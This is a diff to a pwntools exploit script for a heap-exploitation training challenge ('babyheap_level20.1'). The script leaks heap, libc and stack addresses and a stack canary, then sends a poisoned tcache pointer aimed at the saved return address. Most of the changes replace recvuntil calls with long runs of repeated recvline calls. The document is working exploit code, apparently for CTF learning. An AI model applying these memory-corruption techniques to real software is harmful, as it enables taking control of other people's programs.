@@ -1,6 +1,6 @@
 from pwn import * 
 
-binary = './babyheap_level20.0_patched'
+binary = './babyheap_level20.1_patched'
 p = process(binary)
 context.binary = binary
 libc = ELF('./libc.so.6')
@@ -21,21 +21,49 @@ def start():
 start()
 
 p.sendline("safe_write 2")
+
+
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+leak = p.recvline() 
+
+
+
+
+
+
     
     
 
 
 
-
-
-p.recvuntil(b"[*] safe_write(allocations[2])\n")
-leak_data = p.recvline()
-
-heap_addr = u64(leak_data[:8])
+heap_addr = u64(leak[:8])
 heap_addr = heap_addr << 12
 
-
-print(hex(heap_addr))
 
 
 
@@ -43,7 +71,7 @@ print(hex(heap_addr))
 p.sendline("safe_write 2")
 
 libc_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
-print(hex(libc_addr))
+
 
 
 libc_base = libc_addr - 0x21a6a0 
@@ -68,12 +96,94 @@ p.sendline("safe_read 2")
 
 p.sendline(b'A' * 0x10 + p64(0) + p64(0x21) + p64(mangled_ptr))
 
+
+
+
 p.sendline("malloc 3 24")
 p.sendline("malloc 4 24") # the libc chunk to leak stack address
 
 p.sendline("safe_write 4")
-p.recvuntil(b"[*] safe_write(allocations[4])\n")
+
+
+#p.recvuntil(b'\\', drop = False)
 leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+
+
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+leak_data = p.recvline()
+leak_data = p.recvline()
+
+leak_data = p.recvline()
+
+
+
+
 stack_leak = u64(leak_data[:8])
 
 rip = stack_leak - 0x110
@@ -104,9 +214,14 @@ p.sendline("malloc 5 24")
 p.sendline("malloc 6 24") # the libc chunk to leak stack address
 
 p.sendline("safe_write 6")
-p.recvuntil(b"[*] safe_write(allocations[6])\n")
+
+p.recvuntil(b'\x00', drop = False)
+
 leak = p.recvline()
-canary = u64(leak[24:32])  # Using pwntools u64 function
+print(leak)
+
+
+canary = u64(leak[23:31])  # Using pwntools u64 function
 print(hex(canary))  # Should print 0x77c7d077b0912f00
 
 
